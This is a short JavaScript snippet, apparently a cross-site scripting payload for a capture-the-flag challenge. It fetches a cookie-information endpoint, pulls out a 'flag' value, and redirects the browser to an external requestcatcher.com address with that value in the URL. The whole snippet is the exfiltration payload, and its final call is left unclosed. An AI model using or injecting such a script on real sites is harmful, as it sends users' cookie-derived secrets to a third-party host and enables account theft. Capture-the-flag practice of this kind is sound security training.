fetch('/api/v1/my_cookie_info')
  .then((response) => response.json())  // 응답을 JSON으로 파싱
  .then((data) => {
    const flag = data.cookies[0].flag;
    location.href = "https://sflee.requestcatcher.com/test?flag=" + flag;
  }
